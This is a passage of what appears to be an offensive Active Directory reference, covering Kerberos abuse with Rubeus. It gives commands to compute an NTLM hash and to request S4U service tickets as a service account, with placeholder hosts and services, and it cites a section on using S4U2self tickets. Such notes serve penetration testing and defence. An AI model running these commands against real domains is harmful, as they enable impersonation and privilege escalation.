...
```
# Computes the NTLM hash of the specified password.
Rubeus.exe hash /password:<PASSWORD>

# Requests S4U service ticket(s) for the specified service(s) under the identity of the provided service account.
# Example of msdsspn: host/<HOSTNAME> or host/<HOSTNAME_FQDN>
# Example of altservice: host,cifs,http
...
specified. Refer to the `[ActiveDirectory] Kerberos tickets usage` for more
information on techniques and tools to manipulate and use the received
`S4U2self` `service tickets` on both Windows and Linux systems.
